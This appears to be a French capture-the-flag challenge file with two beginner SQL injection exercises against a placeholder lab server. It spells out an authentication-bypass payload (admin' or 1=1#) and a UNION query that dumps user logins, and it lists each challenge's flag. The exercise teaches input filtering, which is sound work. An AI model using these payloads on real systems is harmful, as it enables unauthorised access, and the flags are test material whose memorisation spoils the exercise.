[Challenge_1]
name: Une Authent en béton 
value: 10
category: SQLi
flag:  flag{T0uj0urs_f1ltr3r_l3s_1nputs}
description: 
    Ouvre un navigateur sur l'url http://IPSERVER:8080/login.php

    Tente de te commecter avec le compte admin et le mote de passe admin. On ne sait jamais...

    Comment passer l'authentification quand on ne connait pas le mot de passe ?

    Par chance, le site est encore en protoype et le développeur a laissé actif des options pour débugguer.

    Tu vois qu'il utilise une base de donnée SQL pour gérer les utilisateurs.

    Il utilise la requête :SELECT * FROM users WHERE login='admin' AND passwd=md5('admin')

    Ajoute une quote ' à la fin du nom de user et regarde le résultat...

    Essaye de te connecter avec comme nom de compte: admin' or 1=1# 

    Nous générons la requète: SELECT * FROM users WHERE login='admin' or 1=1#' AND passwd=md5('admin')
    Tous les caractère après le # sont ignorés comme des commentaires.
    Le filtre devient login='admin' or 1=1
    Nous sommes authentifié comme le premier user de la base de donnée.
    




[Challenge_2]
name:  Une balade de santé
value: 10
category: SQLi
flag:  flag_S3ri3ux_m4n_f4ut_f1ltr3r_l3s_1nputs
description: 
    Regarde l'url de consultation des messages. Et le texte de débug en bas.

    La valeur 673489 est passée en paramètre de la requète SQL.

    Nous allons faire une Injection SQL utilisant UNION.
    
    Remplace cette valeur par : 673489 UNION select login from users

    Tu vas générer la requète : SELECT msg FROM messages WHERE idmsg= 673489 UNION select login from users
    Qui va ajouter la liste des utilisateurs à la fin de la liste des messages.



